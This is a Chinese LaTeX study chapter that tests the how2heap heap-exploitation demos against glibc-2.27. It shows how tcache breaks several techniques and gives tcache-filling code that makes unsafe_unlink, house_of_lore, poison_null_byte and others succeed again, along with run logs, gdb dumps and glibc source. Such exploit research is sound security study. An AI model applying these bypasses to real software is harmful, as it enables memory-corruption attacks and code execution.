\begin{center}
    \section{ptmalloc 分析}
\end{center}

\setlength{\parindent}{2em}
此处分析的版本为glibc-2.27中的\verb+malloc+实现。

下载glibc-2.27源码,并编译glibc,单独使用如下命令编译每个文件,将动态链接库替换为我们刚编译好的glibc-2.27:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 unsafe_unlink.c -o unsafe 

$  how2heap git:(master) ✗ ldd unsafe 
    linux-vdso.so.1 =>  (0x00007fffa0a78000)
    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007f98aea71000)
    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f98aee26000)
\end{minted}

\subsection{unsafe\_unlink}
依然使用之前的代码,只不过我们此次将glibc替换为glibc-2.27,此后的操作均相同:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 unsafe_unlink.c -o unsafe_unlink

$  how2heap git:(master) ✗ ldd unsafe_unlink 
    linux-vdso.so.1 =>  (0x00007fff301e7000)
    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007f9d47544000)
    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f9d478f9000)

$  how2heap git:(master) ✗ ./unsafe_unlink 
The global chunk0_ptr is at 0x601070, pointing to 0x1641260
The victim chunk we are going to corrupt is at 0x16412f0
Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: AAAAAAAA
\end{minted}

发现我们unsafe\_unlink攻击失效了。这是因为glibc-2.27添加了在unlink操作时候的检查,其中unlink操作的实现如下:
\begin{minted}[breaklines, frame=lines]{c}
#define unlink(AV, P, BK, FD) {                                                \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))       \
            malloc_printerr ("corrupted size vs. prev_size");                  \
    FD = P->fd;                                                                \
    BK = P->bk;                                                                \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr ("corrupted double-linked list");                        \
    else {                                                                     \
        FD->bk = BK;                                                           \
        BK->fd = FD;                                                           \
        if (!in_smallbin_range (chunksize_nomask (P))                          \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                 \
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)             \
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))             \
          malloc_printerr ("corrupted double-linked list (not small)");        \
            if (FD->fd_nextsize == NULL) {                                     \
                if (P->fd_nextsize == P)                                       \
                  FD->fd_nextsize = FD->bk_nextsize = FD;                      \
                else {                                                         \
                    FD->fd_nextsize = P->fd_nextsize;                          \
                    FD->bk_nextsize = P->bk_nextsize;                          \
                    P->fd_nextsize->bk_nextsize = FD;                          \
                    P->bk_nextsize->fd_nextsize = FD;                          \
                  }                                                            \
              } else {                                                         \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                  \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                  \
              }                                                                \
          }                                                                    \
      }                                                                        \
}
\end{minted}

glibc-2.26引入了tcache机制,这是一种线程缓存机制,每个线程默认情况下有 64 个大小递增的 bins,每个 bin 是一个单链表,默认最多包含 7 个 chunk。其中缓存的 chunk 是不会被合并的,所以在释放 chunk 1 的时候,\verb+chunk0_ptr+ 仍然指向正确的堆地址,而不是之前的 \verb+chunk0_ptr = P = P->fd+。
为了解决这个问题,一种可能的办法是给填充进特定大小的 chunk 把 bin 占满,就像下面这样:
\begin{minted}[breaklines, frame=lines]{c}
    int *a[10];
    int i;
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }
\end{minted}

程序中添加如上代码,运行:
\begin{minted}[breaklines, frame=lines]{bash}
$ ./unsafe_unlink
The global chunk0_ptr is at 0x601070, pointing to 0x6aa260
The victim chunk we are going to corrupt is at 0x6aa2f0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
\end{minted}
利用成功,那么如果我们绕过glibc-2.27中的tcache,即unsafe\_unlink的漏洞仍然存在。

\subsection{house\_of\_spirit}
编译、运行,得到如下结果:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap-g227 gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_spirit.c -o house_of_spirit

$  how2heap-g227 ./house_of_spirit
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffda0ac1420
The second one: 0x7ffda0ac1440
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffda0ac1420.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffda0ac1420, which will be 0x7ffda0ac1430!
malloc(0x10): 0x7ffda0ac1430
\end{minted}

本攻击成功的原因是,我们已经控制了一个将被\verb+ free+的指针,且已经布置好了一个fastbin的\verb+ fake_chunk+的相关参数,接着在\verb+ free+操作时, 这个栈上的“堆块”即被投入 fastbin 中。
下一次\verb+ malloc+对应的大小时, 由于 fastbin 的机制为先进后出, 故上次\verb+ free+的栈上的“堆块”能够被优先返回给用户。

\subsection{house\_of\_lore}
编译,运行得到如下结果,发现攻击不能正常进行:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap-g227 gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_lore.c -o house_of_lore
$  how2heap-g227 ./house_of_lore
Allocated the victim (small) chunk: 0x621260
stack_buffer_1: 0x7fff39008000
stack_buffer_2: 0x7fff39007fe0

Freeing the victim chunk 0x621260, it will be inserted in the unsorted bin
victim->fd: (nil)
victim->bk: 0x4141414141414141

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x621310
The victim chunk 0x621260 will be inserted in front of the SmallBin
victim->fd: (nil)
victim->bk: 0x4141414141414141

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x621260
The fd pointer of stack_buffer_2 has changed: 0x7fff39008000
\end{minted}

攻击失效了,我们来看一下是什么原因使攻击失效。下面的代码是glibc2.27中使用\verb+ tcache+对smallbins的处理方式。

\begin{minted}[breaklines, frame=lines]{c}
    size_t tc_idx = csize2tidx (nb);
    if (tcache && tc_idx < mp_.tcache_bins) {
            mchunkptr tc_victim;
            /* While bin not empty and tcache not full, copy chunks over.  */
            while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin)) != bin) {
          if (tc_victim != 0) {
              bck = tc_victim->bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &main_arena)
            set_non_main_arena (tc_victim);
              bin->bk = bck;
              bck->fd = bin;
              tcache_put (tc_victim, tc_idx);
                }
        }
        }
\end{minted}

从程序的运行结果上来看,\verb+ victim->bk: 0x4141414141414141+的原因成为了我们\verb+ memset()+至内存的字符串,其中一大可能的原因是\verb+ tcache+,源代码的第39行执行完毕后,我们可以在gdb的调试中印证这一点:
\begin{minted}[breaklines, frame=lines]{bash}
gef> x/20gx victim-0x2
0x603250:   0x0000000000000000  0x0000000000000091 <--victim
0x603260:   0x0000000000000000  0x4141414141414141 -
...         0x4141414141414141  0x4141414141414141 | <-- 'A'*0x80
0x6032d0:   0x4141414141414141  0x4141414141414141 -

gef>  vmmap heap
Start              End                Offset             Perm  Path
0x0000000000603000 0x0000000000624000 0x0000000000000000 rw-   [heap]

gef> x/20gx 0x0000000000603000+0x10                <- heap base+0x10
0x603010:   0x0100000000000000  0x0000000000000000 <- tcache_01
0x603020:   0x0000000000000000  0x0000000000000000
0x603030:   0x0000000000000000  0x0000000000000000
0x603040:   0x0000000000000000  0x0000000000000000
0x603050:   0x0000000000000000  0x0000000000000000
0x603060:   0x0000000000000000  0x0000000000000000
0x603070:   0x0000000000000000  0x0000000000000000
0x603080:   0x0000000000000000  0x0000000000603260 <- victim
\end{minted}

在前面已经提到,\verb+ tcache+的作用是为了更快速的unlink,因此unlink下来的堆块首先将被放置在\verb+ tcache+中。因此,我们的处理方式和之前一样,只需要在\verb+ malloc(0x80)+之后添加填满tcache的代码:
\begin{minted}[breaklines, frame=lines]{c}
    // fill the tcache
    int *a[10];
    for (int i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }
\end{minted}

并在再次\verb+ malloc(0x80)+之前清空掉\verb+ tcache+就可以了:
\begin{minted}[breaklines, frame=lines]{c}
    // empty the tcache
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }    
\end{minted}

接着编译后再运行,利用依然可以成功:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 7m 53s 
$ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_lore.c -o house_of_lore_tcache_b

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./house_of_lore_tcache_b
Allocated the victim (small) chunk: 0x230d260
stack_buffer_1: 0x7ffeccacf810
stack_buffer_2: 0x7ffeccacf830

Freeing the victim chunk 0x230d260, it will be inserted in the unsorted bin
victim->fd: 0x7f5adfe2fca0
victim->bk: 0x7f5adfe2fca0

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x230d700
The victim chunk 0x230d260 will be inserted in front of the SmallBin
victim->fd: 0x7f5adfe2fd20
victim->bk: 0x7f5adfe2fd20

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7ffeccacf820
The fd pointer of stack_buffer_2 has changed: 0x7ffeccacf820

Nice jump d00d
\end{minted}

\subsection{house\_of\_einherjar}

编译后运行,\verb+ house_of_einherjar+完全不受影响:
\begin{minted}[breaklines, frame=lines]{shell}
$ ./house_of_einherjar 
We allocate 0x10 bytes for 'a': 0x16b9260

Our fake chunk at 0x7ffce41a2ae0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffce41a2ae0
bck: 0x7ffce41a2ae0
fwd_nextsize: 0x7ffce41a2ae0
bck_nextsize: 0x7ffce41a2ae0

We allocate 0xf8 bytes for 'b': 0x16b9280
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

We write a fake prev_size to the last 8 bytes of a 
so that it will consolidate with our fake chunk
Our fake prev_size will be 0x16b9270 - 0x7ffce41a2ae0 = 0xffff80031d516790

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80031d516790 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x16b9380
\end{minted}

\subsection{house\_of\_orange}

编译,运行,结果报错:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_orange.c -o house_of_orange      

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./house_of_orange   
house_of_orange: malloc.c:2401: sysmalloc: Assertion `(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)' failed.
[1]    9705 abort      ./house_of_orange

\end{minted}

我们在报错信息中可以看到,是在malloc源代码中的第2401行看到:
\begin{minted}[breaklines, frame=lines]{c}
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));
\end{minted}

我们在前面就已经提到过,house\_of\_orange是一种劫持\verb+ _IO_list_all+全局变量来伪造链表的利用技术,通过\verb+ _IO_flush_all_lockp()+函数触发。当glibc检测到内存错误的时候,会依次调用这样的函数路径:\verb+ malloc_printerr -> _libc_message -> abort -> _IO_flush_all_lockp+。
\begin{minted}[breaklines, frame=lines]{c}
// glibc-2.23 in libio/genops.c

int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖为伪造的链表
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)   // 条件
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
        || (_IO_vtable_offset (fp) == 0
          && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
              > fp->_wide_data->_IO_write_base))
#endif
      )
      && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp->_chain;    // 指向我们指定的区域
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
\end{minted}

于是对\verb+ _IO_OVERFLOW(fp, EOF)+的调用会变成对\verb+ system('/bin/sh')+的调用。但是在glibc-2.24中\footnote{https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51}增加了对指针\verb+ vtable+的检查。
所有的\verb+ libio vtables+被放进了专用的只读的\verb+ __libc_IO_vtables+段,以使它们在内存中连续。在任何间接跳转之前,\verb+ vtable+指针将根据段边界进行检查,如果指针不在这个段,则调用函数\verb+ _IO_vtable_check()+做进一步的检查,并且在必要时终止进程:
\begin{minted}[breaklines, frame=lines]{c}
// glibc-2.24 in libio/libioP.h
/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}

// glibc-2.24 in libio/vtables.c
void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (_dl_open_hook != NULL
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
\end{minted}

\subsection{house\_of\_force}

编译,运行:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 10s 
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_force.c -o house_of_force

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./house_of_force                                                                                                                                                 
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x1165260.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20d91
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x1165278, so accounting for the header size, we will malloc 0xffffffffff49bdf8 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x1165280
malloc(0x30) => 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
\end{minted}

glibc-2.27不能防御house\_of\_force的利用。

\subsection{poison\_null\_byte}

编译,运行,不能攻击成功:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 7s 
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 poison_null_byte.c -o poison_null_byte

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./poison_null_byte         
We allocate 0x10 bytes for 'a': 0x1149260
'real' size of 'a': 0x18
b: 0x1149280
c: 0x1149390
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0x1149420
c.prev_size: 0
fake c.prev_size: 0x100

We malloc 'b2', our 'victim' chunk: 0x11494b0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0x1149500

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\end{minted}

我们在gdb中调试,在\verb+ free(b)+这条命令下断点,查看当前的堆分布:
\begin{minted}[breaklines, frame=lines]{bash}
gef> p b
$1 = (uint8_t *) 0x603280 ""

gef> vmmap heap
Start              End                Offset             Perm Path
0x0000000000603000 0x0000000000624000 0x0000000000000000 rw- [heap]

gef> x/30gx 0x0000000000603000+0x10                   <-- heap base
0x603010:   0x0000000000000000  0x0100000000000000    <-- tcache_1
0x603020:   0x0000000000000000  0x0000000000000000
...         ...                 ...
0x6030b0:   0x0000000000000000  0x0000000000000000
0x6030c0:   0x0000000000000000  0x0000000000603280    <-- address of b
\end{minted}

可以很明显的看到,glibc为了效率,没有将\verb+ free+后的b放置在\verb+  unsorted_bins+中。和之前的处理方式一样,我们只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了:
\begin{minted}[breaklines, frame=lines]{c}
    // deal with tcache, line 38
    int *k[10], i;
    for (i = 0; i < 7; i++) {
        k[i] = malloc(0x100);
    }
    for (i = 0; i < 7; i++) {
        free(k[i]);
    }
    free(b);
    
    // deal with tcache
    for (i = 0; i < 7; i++) {
        k[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(k[i]);
    }
    free(b1);
\end{minted}

增加了填满tcache的代码后,重新编译后运行:
\begin{minted}[breaklines, frame=lines]{bash}
$ ./poison_null_byte_tcache
We allocate 0x10 bytes for 'a': 0x1104260
'real' size of 'a': 0x18
b: 0x1104280
c: 0x1104390
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0x110
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0x1104280
c.prev_size: 0x110
fake c.prev_size: 0x70

We malloc 'b2', our 'victim' chunk: 0x1104310
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0x1104280

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\end{minted}

利用成功。

\subsection{unsorted\_bin\_attack}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ ./unsorted_bin_attack    
The target we want to rewrite on stack: 0x7ffd6553aaa0 -> 0

Now, we allocate first small chunk on the heap at: 0x1093260
We free the first chunk now. Its bk pointer point to (nil)
We write it with the target address-0x10: 0x7ffd6553aa90

Let's malloc again to get the chunk we just free: 0x7ffd6553aaa0 -> (nil)
\end{minted}

利用没有成功,我们在gdb中打开,在\verb+ free(p)+后下断,并查看当前堆布局:
\begin{minted}[breaklines, frame=lines]{bash}
gef> p p
$1 = (unsigned long *) 0x602260

gef> vmmap heap
Start              End                Offset             Perm Path
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

gef> x/30gx 0x0000000000602000+0x10                  <-- heap base
0x602010:   0x0100000000000000  0x0000000000000000   <-- tcache_1
0x602020:   0x0000000000000000  0x0000000000000000
...         ...                 ...
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000602260   <-- address of p

\end{minted}

发现还是tcache的影响,我们和之前的操作一样,只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了。但是,与之前的不同的是,从\verb+ unsorted bins+中取出chunks的时候,会先放置在tcache bins中,然后再从 tcache bin 中取出。
那么问题就来了,在放进 tcache bin 的这个过程中,malloc 会以为我们的 target address 也是一个 chunk,然而这个 "chunk" 是过不了检查的,将抛出 "memory corruption" 的错误。如下方的处理逻辑:

\begin{minted}[brraklines, frame=lines]{c}
// in malloc.c, line 3788
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
    {
    bck = victim->bk;
    if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize_nomask (victim)
	      > av->system_mem, 0))
    malloc_printerr ("malloc(): memory corruption");
\end{minted}

那么要想跳过放 chunk 的这个过程,就需要对应 tcache bin 的 counts 域不小于 tcache\_count(默认为7),但如果 counts 不为 0,说明 tcache bin 里是有 chunk 的,那么 malloc 的时候会直接从 tcache bin 里取出,于是就没有 unsorted bin 什么事了:

\begin{minted}[breaklines, frame=lines]{c}
if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
    && tcache
    && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
\end{minted}

这就造成了矛盾,所以我们需要找到一种既能从 unsorted bin 中取 chunk,又不会将 chunk 放进 tcache bin 的办法。这里用到的技术是,tcache poisoning\footnote{详见 http://tukan.farm/2017/07/08/tcache/}。
将 counts 修改成了 \verb+ 0xff+,于是在进行到下面这里时就会进入 else 分支,直接取出 chunk 并返回:

\begin{minted}[breaklines, frame=lines]{c}
// in malloc.c, line 2938
static void * tcache_get (size_t tc_idx) {
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  /* integer overflow: 0x00 - 1 = 0xff 
  make counts=0x00, then, it will be 0xff*/
  --(tcache->counts[tc_idx]);  
  return (void *) e;
}

// in malloc.c, line 3788
#if USE_TCACHE
          /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
          if (tcache_nb
          && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
          else
        {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
\end{minted}

这里值得注意的是,\verb+ tcache_get()+函数内部不包含任何检查措施,也是我们利用成功的原因之一。

\subsection{unsorted\_bin\_into\_stack}

编译,运行,攻击没有成功:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap-227 ./unsorted_bin_into_stack
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x164b260, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffd5f1d1600
malloc(0x100): 0x164b260

\end{minted}

攻击失败了,gdb调试可以看到:
\begin{minted}[breaklines, frame=lines]{bash}
gef> x/30gx 0x0000000000602000+0x10
0x602010:   0x0000000000000000  0x0100000000000000 <-- tcache_1
0x602020:   0x0000000000000000  0x0000000000000000
........:   ...                 ...
0x6020c0:   0x0000000000000000  0x0000000000602260 <-- address of victim

\end{minted}

可以很明显的看到,就像之前影响\verb+ free()+的一样,同样是tcache影响了,我们只需要在代码中将tcache占满即可:
\begin{minted}[breaklines, frame=lines]{c}
// deal with tcache
 int *k[10], i;
 for (i = 0; i < 7; i++) {
     k[i] = malloc(0x80);
 }
 for (i = 0; i < 7; i++) {
     free(k[i]);
 }
\end{minted}

添加后编译运行,攻击成功:

\begin{minted}[frame=lines, breaklines]{bash}
$ how2heap-227 ./unsorted_bin_into_stack
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x1e53260, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffe370742b0
malloc(0x100): 0x7ffe370742b0

\end{minted}

\subsection{fastbin\_dup}

编译运行,依然可以利用成功:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap-227 ./fastbin_dup            
Allocating 3 buffers.
1st malloc(9) 0x24c6260 points to AAAAAAAA
2nd malloc(9) 0x24c6280 points to BBBBBBBB
3rd malloc(9) 0x24c62a0 points to CCCCCCCC
Freeing the first one 0x24c6260.
Then freeing another one 0x24c6280.
Freeing the first one 0x24c6260 again.
Allocating 3 buffers.
4st malloc(9) 0x24c6260 points to DDDDDDDD the first time
5nd malloc(9) 0x24c6280 points to EEEEEEEE
6rd malloc(9) 0x24c6260 points to FFFFFFFF the second time

\end{minted}

\subsection{fastbin\_dup\_into\_stack}

编译运行,可以利用成功:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap-227 ./fastbin_dup_into_stack 
Allocating 3 buffers.
1st malloc(9) 0x7b4260 points to AAAAAAAA
2nd malloc(9) 0x7b4280 points to BBBBBBBB
3rd malloc(9) 0x7b42a0 points to CCCCCCCC
Freeing the first one 0x7b4260.
Then freeing another one 0x7b4280.
Freeing the first one 0x7b4260 again.
Allocating 4 buffers.
4nd malloc(9) 0x7b4260 points to 0x7ffd81252860
5nd malloc(9) 0x7b4280 points to EEEEEEEE
6rd malloc(9) 0x7b4260 points to FFFFFFFF
7th malloc(9) 0x7ffd81252850 points to GGGGGGGG

\end{minted}

\subsection{overlapping\_chunks}

攻击成功。

\subsection{overlapping\_chunks\_2}

攻击成功。
\newpage